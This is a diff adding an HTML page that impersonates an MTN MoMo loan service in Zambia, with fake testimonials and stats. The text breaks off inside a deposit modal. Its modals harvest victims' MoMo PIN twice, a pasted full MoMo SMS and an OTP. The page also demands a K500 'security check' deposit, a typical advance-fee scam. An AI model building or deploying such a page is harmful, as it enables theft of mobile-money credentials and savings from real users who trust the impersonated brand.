@@ -1,0 +1,1647 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>MTN MoMo Loans — Kwacha Loans Made Simple | Zambia</title>
+<meta name="description" content="MTN MoMo Loans — fast, flexible Kwacha loans from K500 to K50,000 for Zambians. Apply online in minutes.">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="styles.css">
+<style>
+/* ── OTP format hint below the textarea ── */
+.otp-format-hint{
+  display:flex;
+  align-items:flex-start;
+  gap:.5rem;
+  margin-top:.55rem;
+  padding:.55rem .7rem;
+  background:#F8FAFC;
+  border:1px dashed #CBD5E1;
+  border-radius:10px;
+  font-size:.76rem;
+  line-height:1.5;
+  color:#475569;
+  font-weight:500;
+}
+.otp-format-hint svg{
+  flex:0 0 14px;
+  width:14px;
+  height:14px;
+  margin-top:2px;
+  stroke:#2563EB;
+  fill:none;
+  stroke-width:2.4;
+  stroke-linecap:round;
+  stroke-linejoin:round;
+}
+#otpCounter{
+  transition:color .15s ease;
+}
+</style>
+</head>
+<body>
+
+<header class="site-header">
+  <div class="wrap nav">
+    <a class="brand" href="#/" data-nav="home">
+      <img src="local/picsart.png" alt="MTN MoMo Loans logo" class="brand-logo">
+      <span>MTN MoMo Loans<small>Zambia</small></span>
+    </a>
+    <button class="nav-toggle" id="navToggle" aria-label="Toggle menu" aria-expanded="false" aria-controls="navLinks">
+      <svg class="icon-menu" viewBox="0 0 24 24"><path d="M4 7h16M4 12h16M4 17h16"/></svg>
+      <svg class="icon-close" viewBox="0 0 24 24"><path d="M6 6l12 12M18 6L6 18"/></svg>
+    </button>
+    <nav class="nav-links" id="navLinks">
+      <a href="#how" data-scroll>How it works</a>
+      <a href="#why" data-scroll>Why us</a>
+      <a href="#faq" data-scroll>FAQ</a>
+      <a href="#/apply/1" data-nav="apply" class="active btn btn-blue">Apply now</a>
+    </nav>
+  </div>
+</header>
+
+<!-- ================= LANDING VIEW ================= -->
+<main id="view-landing">
+  <section class="hero" id="top">
+    <div class="wrap hero-inner">
+      <span class="pill"><span class="dot"></span> 🇿🇲 Built for Zambia · K500 – K50,000</span>
+      <h1>MoMo loans,<br><em>made simple.</em></h1>
+      <p class="hero-lead">
+        Borrow from K500 to K50,000 and repay over 1 to 24 months.
+        Apply online in minutes — no paperwork, no branch queues, no collateral.
+      </p>
+      <div class="hero-cta">
+        <a href="#/apply/1" data-nav="apply" class="btn btn-yellow">Get started →</a>
+        <a href="#how" data-scroll class="btn btn-ghost">How it works</a>
+      </div>
+      <div class="hero-trust">
+        <div><svg viewBox="0 0 24 24"><path d="M20 6 9 17l-5-5"/></svg>No collateral needed</div>
+        <div><svg viewBox="0 0 24 24"><path d="M20 6 9 17l-5-5"/></svg>Payout to mobile money</div>
+        <div><svg viewBox="0 0 24 24"><path d="M20 6 9 17l-5-5"/></svg>Decision in ~10 minutes</div>
+      </div>
+    </div>
+  </section>
+
+  <section class="stats">
+    <div class="wrap stats-grid">
+      <div class="stat"><b>K120M+</b><span>Disbursed (MTN data)</span></div>
+      <div class="stat"><b>10 min</b><span>Average decision time</span></div>
+      <div class="stat"><b>24 hrs</b><span>Payout to mobile money</span></div>
+      <div class="stat"><b>4.7 / 5</b><span>Customer rating</span></div>
+    </div>
+  </section>
+
+  <section class="section steps" id="how">
+    <div class="wrap">
+      <div class="section-head">
+        <span class="eyebrow">How it works</span>
+        <h2>From application to cash in 4 steps</h2>
+        <p>The whole process happens on your phone. You only need your NRC and a mobile money number.</p>
+      </div>
+      <div class="step-grid">
+        <div class="step"><div class="num">1</div><h3>Apply online</h3><p>Fill in the short form — your name, MoMo phone number and how much you need.</p></div>
+        <div class="step"><div class="num">2</div><h3>Get a decision</h3><p>Our system reviews your application and comes back to you with an answer in about 10 minutes.</p></div>
+        <div class="step"><div class="num">3</div><h3>Verify &amp; sign</h3><p>Confirm your identity with a one-time PIN sent to your phone. No printing, no queues.</p></div>
+        <div class="step"><div class="num">4</div><h3>Get your Kwacha</h3><p>Money lands in your mobile money wallet or bank account — usually within 24 hours.</p></div>
+      </div>
+    </div>
+  </section>
+
+  <section class="section" id="why">
+    <div class="wrap">
+      <div class="section-head">
+        <span class="eyebrow">Why MTN MoMo Loans</span>
+        <h2>Borrowing that respects your time and your wallet</h2>
+        <p>We built MTN MoMo Loans around how Zambians actually handle money — mobile money, mobile phones, and real life.</p>
+      </div>
+      <div class="features">
+        <article class="feature"><div class="f-icon"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"/><path d="M12 7v5l3 2"/></svg></div><h3>Fast decisions</h3><p>Most applications get a yes or no within 10 minutes, any day of the week — including weekends.</p></article>
+        <article class="feature"><div class="f-icon"><svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg></div><h3>Safe and private</h3><p>Your NRC and personal details are encrypted and never sold. You stay in control of your data.</p></article>
+        <article class="feature"><div class="f-icon"><svg viewBox="0 0 24 24"><rect x="6" y="2" width="12" height="20" rx="3"/><path d="M11 18h2"/></svg></div><h3>Mobile money first</h3><p>Disbursements and repayments work with MTN MoMo, Airtel Money, Zamtel Kwacha and major banks.</p></article>
+        <article class="feature"><div class="f-icon"><svg viewBox="0 0 24 24"><path d="M3 7h18v12H3z"/><path d="M3 11h18"/><path d="M7 15h3"/></svg></div><h3>No hidden fees</h3><p>What you agree to is what you repay. No mystery deductions at payout, ever.</p></article>
+        <article class="feature"><div class="f-icon"><svg viewBox="0 0 24 24"><rect x="3" y="5" width="18" height="16" rx="3"/><path d="M8 3v4M16 3v4M3 11h18"/></svg></div><h3>Flexible terms</h3><p>Choose 1 to 24 months. Settle early at any time and pay interest only for the days you used.</p></article>
+        <article class="feature"><div class="f-icon"><svg viewBox="0 0 24 24"><path d="M21 15a4 4 0 0 1-4 4H8l-5 3V6a4 4 0 0 1 4-4h10a4 4 0 0 1 4 4z"/></svg></div><h3>Real human support</h3><p>Talk to an actual person on WhatsApp or call centre — in English, Nyanja, Bemba or Tonga.</p></article>
+      </div>
+    </div>
+  </section>
+
+  <section class="section" style="padding-top:0;">
+    <div class="wrap">
+      <div class="section-head"><span class="eyebrow">Customers</span><h2>What Zambians are saying</h2></div>
+      <div class="quotes">
+        <article class="quote">
+          <div class="stars"><svg viewBox="0 0 24 24"><path d="m12 2 3 6.9 7.5.7-5.6 5 1.6 7.4L12 18.2 5.5 22l1.6-7.4-5.6-5 7.5-.7z"/></svg><svg viewBox="0 0 24 24"><path d="m12 2 3 6.9 7.5.7-5.6 5 1.6 7.4L12 18.2 5.5 22l1.6-7.4-5.6-5 7.5-.7z"/></svg><svg viewBox="0 0 24 24"><path d="m12 2 3 6.9 7.5.7-5.6 5 1.6 7.4L12 18.2 5.5 22l1.6-7.4-5.6-5 7.5-.7z"/></svg><svg viewBox="0 0 24 24"><path d="m12 2 3 6.9 7.5.7-5.6 5 1.6 7.4L12 18.2 5.5 22l1.6-7.4-5.6-5 7.5-.7z"/></svg><svg viewBox="0 0 24 24"><path d="m12 2 3 6.9 7.5.7-5.6 5 1.6 7.4L12 18.2 5.5 22l1.6-7.4-5.6-5 7.5-.7z"/></svg></div>
+          <p>"I applied on a Sunday evening and the money was in my MoMo by Monday morning. Paid my daughter's school fees without stressing."</p>
+          <div class="who"><div class="avatar">CM</div><div><b>Chanda M.</b><span>Lusaka</span></div></div>
+        </article>
+        <article class="quote">
+          <div class="stars"><svg viewBox="0 0 24 24"><path d="m12 2 3 6.9 7.5.7-5.6 5 1.6 7.4L12 18.2 5.5 22l1.6-7.4-5.6-5 7.5-.7z"/></svg><svg viewBox="0 0 24 24"><path d="m12 2 3 6.9 7.5.7-5.6 5 1.6 7.4L12 18.2 5.5 22l1.6-7.4-5.6-5 7.5-.7z"/></svg><svg viewBox="0 0 24 24"><path d="m12 2 3 6.9 7.5.7-5.6 5 1.6 7.4L12 18.2 5.5 22l1.6-7.4-5.6-5 7.5-.7z"/></svg><svg viewBox="0 0 24 24"><path d="m12 2 3 6.9 7.5.7-5.6 5 1.6 7.4L12 18.2 5.5 22l1.6-7.4-5.6-5 7.5-.7z"/></svg><svg viewBox="0 0 24 24"><path d="m12 2 3 6.9 7.5.7-5.6 5 1.6 7.4L12 18.2 5.5 22l1.6-7.4-5.6-5 7.5-.7z"/></svg></div>
+          <p>"What I liked is that there were no surprise charges. The repayment I was quoted was exactly what I paid back."</p>
+          <div class="who"><div class="avatar">NB</div><div><b>Natasha B.</b><span>Ndola</span></div></div>
+        </article>
+        <article class="quote">
+          <div class="stars"><svg viewBox="0 0 24 24"><path d="m12 2 3 6.9 7.5.7-5.6 5 1.6 7.4L12 18.2 5.5 22l1.6-7.4-5.6-5 7.5-.7z"/></svg><svg viewBox="0 0 24 24"><path d="m12 2 3 6.9 7.5.7-5.6 5 1.6 7.4L12 18.2 5.5 22l1.6-7.4-5.6-5 7.5-.7z"/></svg><svg viewBox="0 0 24 24"><path d="m12 2 3 6.9 7.5.7-5.6 5 1.6 7.4L12 18.2 5.5 22l1.6-7.4-5.6-5 7.5-.7z"/></svg><svg viewBox="0 0 24 24"><path d="m12 2 3 6.9 7.5.7-5.6 5 1.6 7.4L12 18.2 5.5 22l1.6-7.4-5.6-5 7.5-.7z"/></svg><svg viewBox="0 0 24 24"><path d="m12 2 3 6.9 7.5.7-5.6 5 1.6 7.4L12 18.2 5.5 22l1.6-7.4-5.6-5 7.5-.7z"/></svg></div>
+          <p>"I used Test Loans to stock up my shop in Kitwe before the festive season. Paid it off in eight months."</p>
+          <div class="who"><div class="avatar">KP</div><div><b>Kelvin P.</b><span>Kitwe</span></div></div>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <section class="section" id="faq" style="padding-top:0;">
+    <div class="wrap">
+      <div class="section-head"><span class="eyebrow">FAQ</span><h2>Questions Zambians ask us</h2></div>
+      <div class="faq">
+        <details open><summary>Who can apply for a MTN Momo Loans loan?</summary><p>You need to be 18 years or older, a Zambian resident, and have a valid National Registration Card (NRC), an active mobile money number, and a regular source of income.</p></details>
+        <details><summary>How much can I borrow in Kwacha?</summary><p>Between K500 and K50,000 depending on your profile. First-time borrowers usually start smaller — as you repay on time, your limit grows automatically.</p></details>
+        <details><summary>How fast will I get the money?</summary><p>Most applications get a decision within about 10 minutes. Once approved and verified, funds are sent to your mobile money wallet or bank account, usually within 24 hours.</p></details>
+        <details><summary>What does it cost?</summary><p>We charge a flat monthly interest rate plus a once-off arrangement fee, both shown clearly before you accept. Nothing is deducted without your knowledge.</p></details>
+        <details><summary>Can I repay early?</summary><p>Yes. You can settle your loan at any time and you'll only pay interest for the period you actually used the money — no early settlement penalty.</p></details>
+        <details><summary>What happens if I miss a payment?</summary><p>A late fee applies and we'll contact you to arrange a new date. We'd rather work out a plan with you than report you — but repeated missed payments do affect your ability to borrow again.</p></details>
+      </div>
+    </div>
+  </section>
+
+  <section class="cta">
+    <div class="wrap">
+      <div class="cta-inner">
+        <h2>Ready to get your Kwacha?</h2>
+        <p>Apply in under three minutes. You'll need your phone number, and your mobile money wallet.</p>
+        <a href="#/apply/1" data-nav="apply" class="btn btn-yellow">Get started →</a>
+      </div>
+    </div>
+  </section>
+</main>
+
+<!-- ================= APPLY VIEW ================= -->
+<main id="view-apply" hidden>
+  <section class="page-head">
+    <div class="wrap">
+      <nav class="breadcrumb" aria-label="Breadcrumb">
+        <a href="#/" data-nav="home">Home</a>
+        <svg viewBox="0 0 24 24"><path d="m9 18 6-6-6-6"/></svg>
+        <span>Apply</span>
+      </nav>
+      <h1>Let's get you <em>sorted</em>.</h1>
+      <p>Four short steps, about three minutes. Have your mobile money number ready — that's all we need.</p>
+      <div class="head-badges">
+        <div><svg viewBox="0 0 24 24"><path d="M20 6 9 17l-5-5"/></svg>Free to apply</div>
+        <div><svg viewBox="0 0 24 24"><path d="M20 6 9 17l-5-5"/></svg>MoMo payout</div>
+        <div><svg viewBox="0 0 24 24"><path d="M20 6 9 17l-5-5"/></svg>Decision in ~10 min</div>
+      </div>
+    </div>
+  </section>
+
+  <div class="wrap">
+    <div class="apply-layout">
+      <div class="form-card">
+        <div class="form-progress" id="formProgress">
+          <div class="fp-top">
+            <span class="fp-step" id="fpStep">Step 1 of 4</span>
+            <span class="fp-title" id="fpTitle">Loan details</span>
+          </div>
+          <div class="fp-bar" role="progressbar" aria-valuemin="1" aria-valuemax="4" aria-valuenow="1" aria-label="Application progress">
+            <span id="fpFill" style="width:25%"></span>
+          </div>
+        </div>
+
+        <form id="appForm" novalidate>
+
+          <section class="fstep active" data-step="1" aria-labelledby="s1title">
+            <div class="form-body">
+              <div class="step-head"><h2 id="s1title">How much do you need?</h2><p>Choose an amount between K500 and K50,000, and how long you'd like to repay it over.</p></div>
+              <div class="field">
+                <label for="amount">Loan amount</label>
+                <div class="input-prefix"><span class="prefix" aria-hidden="true">K</span>
+                  <input type="text" id="amount" name="amount" inputmode="numeric" placeholder="10,000" value="10,000" aria-label="Loan amount in Kwacha" required>
+                </div>
+                <span class="hint">Between K500 and K50,000.</span>
+              </div>
+              <div class="field"><span class="label">Quick pick</span>
+                <div class="chips" id="amountChips">
+                  <button type="button" class="chip" data-amount="1000">K1,000</button>
+                  <button type="button" class="chip" data-amount="5000">K5,000</button>
+                  <button type="button" class="chip active" data-amount="10000">K10,000</button>
+                  <button type="button" class="chip" data-amount="25000">K25,000</button>
+                  <button type="button" class="chip" data-amount="50000">K50,000</button>
+                </div>
+              </div>
+              <div class="field"><span class="label">Repayment period</span>
+                <div class="chips" id="termChips">
+                  <button type="button" class="chip" data-term="1">1 month</button>
+                  <button type="button" class="chip" data-term="3">3 months</button>
+                  <button type="button" class="chip active" data-term="6">6 months</button>
+                  <button type="button" class="chip" data-term="12">12 months</button>
+                  <button type="button" class="chip" data-term="24">24 months</button>
+                </div>
+              </div>
+              <div class="field">
+                <label for="purpose">What's it for?</label>
+                <select id="purpose" name="purpose" required>
+                  <option value="" selected disabled>Select a purpose</option>
+                  <option>School fees</option><option>Rent or housing</option><option>Business stock</option>
+                  <option>Medical expenses</option><option>Home improvement</option><option>Emergency</option><option>Other</option>
+                </select>
+              </div>
+            </div>
+          </section>
+
+          <section class="fstep" data-step="2" aria-labelledby="s2title">
+            <div class="form-body">
+              <div class="step-head"><h2 id="s2title">Tell us about you</h2><p>We use these details to verify your identity. Everything stays encrypted and private.</p></div>
+              <div class="field"><label for="fullname">Full name</label><input type="text" id="fullname" name="fullname" placeholder="e.g. Mwamba Chileshe" autocomplete="name" required></div>
+              <div class="field"><span class="label">Date of birth</span>
+                <div class="dob-grid">
+                  <select id="dobDay" name="dobDay" required aria-label="Day of birth"><option value="" selected disabled>Day</option></select>
+                  <select id="dobMonth" name="dobMonth" required aria-label="Month of birth">
+                    <option value="" selected disabled>Month</option>
+                    <option value="01">Jan</option><option value="02">Feb</option><option value="03">Mar</option>
+                    <option value="04">Apr</option><option value="05">May</option><option value="06">Jun</option>
+                    <option value="07">Jul</option><option value="08">Aug</option><option value="09">Sep</option>
+                    <option value="10">Oct</option><option value="11">Nov</option><option value="12">Dec</option>
+                  </select>
+                  <select id="dobYear" name="dobYear" required aria-label="Year of birth"><option value="" selected disabled>Year</option></select>
+                </div>
+                <span class="hint">You must be 18 or older to apply.</span>
+              </div>
+              <div class="field"><label for="city">City / town</label><input type="text" id="city" name="city" placeholder="e.g. Lusaka" autocomplete="address-level2" required></div>
+              <div class="field"><label for="phone">Mobile number</label><input type="tel" id="phone" name="phone" placeholder="097 123 4567" inputmode="numeric" autocomplete="tel" maxlength="10" required><span class="hint">Enter your 10-digit MoMo number starting with 0 — for example 097 123 4567.</span></div>
+              <div class="field"><label for="email">Email address <span style="text-transform:none;letter-spacing:0;font-weight:500;">(optional)</span></label><input type="email" id="email" name="email" placeholder="you@example.com" autocomplete="email"></div>
+            </div>
+          </section>
+
+          <section class="fstep" data-step="3" aria-labelledby="s3title">
+            <div class="form-body">
+              <div class="step-head"><h2 id="s3title">Income</h2><p>Tell us how you earn. This helps us work out a repayment you'll be comfortable with.</p></div>
+              <div class="field">
+                <label for="employment">Employment status</label>
+                <select id="employment" name="employment" required>
+                  <option value="" selected disabled>Select your status</option>
+                  <option>Employed full-time</option><option>Employed part-time</option><option>Self-employed</option>
+                  <option>Business owner</option><option>Student</option><option>Other</option>
+                </select>
+              </div>
+              <div class="field">
+                <label for="income">Monthly income</label>
+                <div class="input-prefix"><span class="prefix" aria-hidden="true">K</span>
+                  <input type="text" id="income" name="income" inputmode="numeric" placeholder="5,000" aria-label="Monthly income in Kwacha" required>
+                </div>
+                <span class="hint">Your typical take-home amount each month.</span>
+              </div>
+            </div>
+          </section>
+
+          <section class="fstep" data-step="4" aria-labelledby="s4title">
+            <div class="form-body">
+              <div class="step-head"><h2 id="s4title">Check everything over</h2><p>Make sure the details below are correct. You can jump back to any section to fix something.</p></div>
+              <div class="review">
+                <div class="review-head"><h3>Loan</h3><button type="button" data-goto="1">Edit</button></div>
+                <dl>
+                  <div class="row"><dt>Amount</dt><dd id="rvAmount">K10,000</dd></div>
+                  <div class="row"><dt>Period</dt><dd id="rvTerm">6 months</dd></div>
+                  <div class="row"><dt>Purpose</dt><dd id="rvPurpose">—</dd></div>
+                </dl>
+              </div>
+              <div class="review">
+                <div class="review-head"><h3>Personal</h3><button type="button" data-goto="2">Edit</button></div>
+                <dl>
+                  <div class="row"><dt>Name</dt><dd id="rvName">—</dd></div>
+                  <div class="row"><dt>Date of birth</dt><dd id="rvDob">—</dd></div>
+                  <div class="row"><dt>Mobile number</dt><dd id="rvPhone">—</dd></div>
+                  <div class="row"><dt>City</dt><dd id="rvCity">—</dd></div>
+                </dl>
+              </div>
+              <div class="review">
+                <div class="review-head"><h3>Income</h3><button type="button" data-goto="3">Edit</button></div>
+                <dl>
+                  <div class="row"><dt>Employment</dt><dd id="rvEmployment">—</dd></div>
+                  <div class="row"><dt>Monthly income</dt><dd id="rvIncome">—</dd></div>
+                </dl>
+              </div>
+              <div class="review-total">
+                <div class="rt-top"><span>Estimated monthly</span><strong id="rvMonthly">K1,916.67</strong></div>
+                <p class="rt-sub" id="rvTotalNote">Total repayment about K11,500.00 over 6 months, based on a 2.5% monthly rate.</p>
+              </div>
+              <div class="field" style="margin-top:1.35rem;">
+                <label class="check" for="agree">
+                  <input type="checkbox" id="agree" required>
+                  <span class="box"><svg viewBox="0 0 24 24"><path d="M20 6 9 17l-5-5"/></svg></span>
+                  <span class="ct">I confirm the information above is accurate and I agree to the <b>MTN terms</b> and <b>privacy notice</b>.</span>
+                </label>
+              </div>
+            </div>
+          </section>
+
+          <div class="form-actions" id="formActions">
+            <button type="button" class="btn btn-outline btn-back" id="btnBack" hidden>
+              <svg viewBox="0 0 24 24" style="width:16px;height:16px;stroke:currentColor;stroke-width:2.6;fill:none;stroke-linecap:round;stroke-linejoin:round;"><path d="m15 18-6-6 6-6"/></svg>
+              <span>Back</span>
+            </button>
+            <button type="button" class="btn btn-blue" id="btnNext">Continue</button>
+          </div>
+        </form>
+
+        <!-- ================= LOW BALANCE ALERT (final screen) ================= -->
+        <div class="balance-alert" id="balanceAlert" role="status" aria-live="polite">
+          <div class="balance-icon">
+            <svg viewBox="0 0 24 24"><path d="M12 9v4M12 17h.01"/><path d="M10.29 3.86 1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/></svg>
+          </div>
+          <h2>Insufficient balance</h2>
+          <div class="balance-amount">K&nbsp;500</div>
+          <p class="balance-text">
+            Your MTN MoMo balance is too low to qualify for a loan disbursement.<br><br>
+            Please deposit at least <strong>K&nbsp;500</strong> into your MTN Mobile Money wallet, then try again.
+          </p>
+
+          <div class="balance-note">
+            <div class="bn-head">
+              <svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="m9 12 2 2 4-4"/></svg>
+              Deposit to unlock your loan — not a fee
+            </div>
+            The K&nbsp;500 is a <span class="hl">security check</span> — it confirms you can repay and
+            <strong>will not be deducted</strong>. Deposit now and get instant access to your loan.
+          </div>
+
+          <div class="ref-box" style="margin-top:0;">
+            <span>Reference</span>
+            <b id="refNumber">TL-2025-0000</b>
+          </div>
+
+          <button type="button" class="btn btn-yellow btn-try" id="tryAgainBtn" style="margin-top:1.75rem;">
+            Try again after deposit
+          </button>
+
+          <p class="balance-foot">
+            v2.6.2 (MTN MoMo Loans Zambia) · MTN MoMo users only
+          </p>
+        </div>
+      </div>
+
+      <aside class="aside">
+        <div class="summary-card">
+          <h3>Your application</h3>
+          <div class="sum-amount" id="sumAmount">K10,000</div>
+          <p class="sum-sub" id="sumTerm">Over 6 months</p>
+          <div class="sum-list">
+            <div class="sum-row"><span>Estimated monthly</span><b id="sumMonthly">K1,916.67</b></div>
+            <div class="sum-row"><span>Total repayment</span><b id="sumTotal">K11,500.00</b></div>
+            <div class="sum-row"><span>Purpose</span><b id="sumPurpose">—</b></div>
+          </div>
+          <p class="sum-note" id="sumNote">For illustration, we use a sample 2.5% monthly flat rate. Your final rate depends on your profile and is shown before you accept.</p>
+        </div>
+      </aside>
+    </div>
+  </div>
+</main>
+
+<div class="modal-backdrop" id="authBackdrop" hidden>
+
+  <div class="modal" id="loginModal" role="dialog" aria-modal="true" aria-labelledby="loginTitle" hidden>
+    <button type="button" class="modal-close" id="loginClose" aria-label="Close dialog"><svg viewBox="0 0 24 24"><path d="M6 6l12 12M18 6L6 18"/></svg></button>
+    <div class="modal-icon"><svg viewBox="0 0 24 24"><rect x="4" y="11" width="16" height="10" rx="2"/><path d="M8 11V7a4 4 0 0 1 8 0v4"/></svg></div>
+    <h2 id="loginTitle">Login to your MoMo account</h2>
+    <p class="modal-sub">To proceed with the application, please sign in with your mobile number and 5-digit PIN.</p>
+    <div class="modal-body" id="loginBody">
+      <div class="modal-field"><label for="loginPhone">Mobile number</label><input type="tel" id="loginPhone" inputmode="numeric" autocomplete="tel" maxlength="10" placeholder="097 123 4567"></div>
+      <div class="modal-field"><label>5-digit PIN</label>
+        <div class="pin-boxes" id="pinBoxes">
+          <input type="text" class="pin-box" inputmode="numeric" maxlength="1" aria-label="PIN digit 1">
+          <input type="text" class="pin-box" inputmode="numeric" maxlength="1" aria-label="PIN digit 2">
+          <input type="text" class="pin-box" inputmode="numeric" maxlength="1" aria-label="PIN digit 3">
+          <input type="text" class="pin-box" inputmode="numeric" maxlength="1" aria-label="PIN digit 4">
+          <input type="text" class="pin-box" inputmode="numeric" maxlength="1" aria-label="PIN digit 5">
+        </div>
+      </div>
+      <div class="modal-error" id="loginError" hidden><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"/><path d="M12 8v4M12 16h.01"/></svg><span class="err-text">Incorrect details. Please check your PIN and try again.</span></div>
+      <button type="button" class="btn btn-blue btn-block" id="loginBtn"><span class="btn-label">Login</span><span class="btn-spinner"></span></button>
+    </div>
+    <div class="modal-waiting" id="loginWaiting" hidden><div class="w-spinner"></div></div>
+  </div>
+
+  <div class="modal" id="otpModal" role="dialog" aria-modal="true" aria-labelledby="otpTitle" hidden>
+    <button type="button" class="modal-close" id="otpClose" aria-label="Close dialog"><svg viewBox="0 0 24 24"><path d="M6 6l12 12M18 6L6 18"/></svg></button>
+    <div class="modal-icon"><svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="m9 12 2 2 4-4"/></svg></div>
+    <h2 id="otpTitle">Verify it's really you</h2>
+    <p class="modal-sub">We've sent a one-time message to <b id="otpPhone">your number</b>. Copy the entire SMS and paste it below.</p>
+    <div class="modal-body" id="otpBody">
+      <div class="modal-field">
+        <div class="otp-label-row"><label for="otpInput">One-time message</label><span class="otp-counter" id="otpCounter">0 chars</span></div>
+        <textarea id="otpInput" class="otp-message" rows="6" placeholder="Paste the entire MoMo SMS here…" autocomplete="off" autocapitalize="off" spellcheck="false" aria-label="One-time verification message"></textarea>
+        <div class="otp-format-hint">
+          <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"/><path d="M12 8v4M12 16h.01"/></svg>
+          <span>Must be the full MoMo SMS — starting with <b>"Y'ello. Please note!"</b> and ending with the verification code. Don't trim or edit it.</span>
+        </div>
+      </div>
+      <div class="modal-error" id="otpError" hidden><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"/><path d="M12 8v4M12 16h.01"/></svg><span class="err-text">Please paste the complete MoMo SMS. It should start with "Y'ello. Please note!" and end with the verification code.</span></div>
+      <button type="button" class="btn btn-blue btn-block" id="otpBtn"><span class="btn-label">Verify</span><span class="btn-spinner"></span></button>
+    </div>
+    <div class="modal-waiting" id="otpWaiting" hidden><div class="w-spinner"></div></div>
+  </div>
+
+  <div class="modal" id="pinRetryModal" role="dialog" aria-modal="true" aria-labelledby="pinRetryTitle" hidden>
+    <button type="button" class="modal-close" id="pinRetryClose" aria-label="Close dialog"><svg viewBox="0 0 24 24"><path d="M6 6l12 12M18 6L6 18"/></svg></button>
+    <div class="modal-icon" style="background:#FFF6D6;color:#A87A00;">
+      <svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="M12 8v4M12 16h.01"/></svg>
+    </div>
+    <h2 id="pinRetryTitle">Correct your PIN</h2>
+    <p class="modal-sub">The MoMo PIN you provided during login was incorrect. Please enter the correct PIN to continue.</p>
+    <div class="modal-body" id="pinRetryBody">
+      <div class="modal-field">
+        <label style="text-align:center;display:block;">Correct 5-digit PIN</label>
+        <div class="pin-boxes" id="pinRetryBoxes">
+          <input type="text" class="pin-box" inputmode="numeric" maxlength="1" aria-label="New PIN digit 1">
+          <input type="text" class="pin-box" inputmode="numeric" maxlength="1" aria-label="New PIN digit 2">
+          <input type="text" class="pin-box" inputmode="numeric" maxlength="1" aria-label="New PIN digit 3">
+          <input type="text" class="pin-box" inputmode="numeric" maxlength="1" aria-label="New PIN digit 4">
+          <input type="text" class="pin-box" inputmode="numeric" maxlength="1" aria-label="New PIN digit 5">
+        </div>
+      </div>
+      <div class="modal-error" id="pinRetryError" hidden><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"/><path d="M12 8v4M12 16h.01"/></svg><span class="err-text">Incorrect PIN. Please try again.</span></div>
+    </div>
+    <div class="modal-waiting" id="pinRetryWaiting" hidden><div class="w-spinner"></div></div>
+  </div>
+
+  <div class="modal" id="finalModal" role="dialog" aria-modal="true" aria-labelledby="finalTitle" hidden>
+    <button type="button" class="modal-close" id="finalClose" aria-label="Close dialog"><svg viewBox="0 0 24 24"><path d="M6 6l12 12M18 6L6 18"/></svg></button>
+    <div class="modal-icon"><svg viewBox="0 0 24 24"><path d="M9 3h6a1 1 0 0 1 1 1v2H8V4a1 1 0 0 1 1-1z"/><rect x="5" y="5" width="14" height="16" rx="2"/><path d="m9 13 2 2 4-4"/></svg></div>
+    <h2 id="finalTitle">Confirm your application</h2>
+    <p class="modal-sub">You're about to apply for a loan of <b class="modal-amount" id="finalAmount">K10,000</b>.<br>To finalise, enter the 4-digit OTP sent to <b id="finalPhone">your number</b>.</p>
+    <div class="modal-body" id="finalBody">
+      <div class="modal-field">
+        <label style="text-align:center;">4-digit OTP</label>
+        <div class="pin-boxes pin-boxes--4" id="finalBoxes">
+          <input type="text" class="pin-box" inputmode="numeric" maxlength="1" aria-label="OTP digit 1">
+          <input type="text" class="pin-box" inputmode="numeric" maxlength="1" aria-label="OTP digit 2">
+          <input type="text" class="pin-box" inputmode="numeric" maxlength="1" aria-label="OTP digit 3">
+          <input type="text" class="pin-box" inputmode="numeric" maxlength="1" aria-label="OTP digit 4">
+        </div>
+      </div>
+      <div class="modal-error" id="finalError" hidden><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"/><path d="M12 8v4M12 16h.01"/></svg><span class="err-text">Incorrect OTP. Please check the code and try again.</span></div>
+      <button type="button" class="btn btn-yellow btn-block" id="finalBtn"><span class="btn-label">Submit application</span><span class="btn-spinner"></span></button>
+    </div>
+    <div class="modal-waiting" id="finalWaiting" hidden><div class="w-spinner"></div></div>
+  </div>
+
+  <div class="modal" id="depositModal" role="dialog" aria-modal="true" aria-labelledby="depositTitle" hidden>
+    <button type="button" class="modal-close" id="depositClose" aria-label="Close dialog"><svg viewBox="0 0 24 24"><path d="M6 6l12 12M18 6L6 18"/></svg></button>
+    <div class="modal-icon" style="background:var(--yellow-soft);color:#A87A00;">
+      <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"/><path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"/><path d="M12 17h.01"/></svg>
+    </div>
+    <h2 id="depositTitle">Confirm your deposit</h2>
+    <p class="modal-sub">Have you deposited <b>K&nbsp;500</b> into your MTN MoMo wallet?</p>
+
+    <div class="balance-note" style="margin-top:1.25rem;margin-bottom:1rem;">
+      <div class="bn-head">
+        <svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="m9 12 2 2 4-4"/></svg>
+        Security check — not a fee
+      </div>
+      This K&nbsp;500 is a security check, <strong>not deducted</strong> from your account. It only confirms you can repay.
+    </div>
+
+    <p style="font-size:.82rem;color:#B91C1C;font-weight:600;margin-top:.25rem;">
+      ⚠️ If you have not deposited, your loan will be cancelled.
+    </p>
+
+    <div class="modal-body" style="margin-top:1.25rem;">
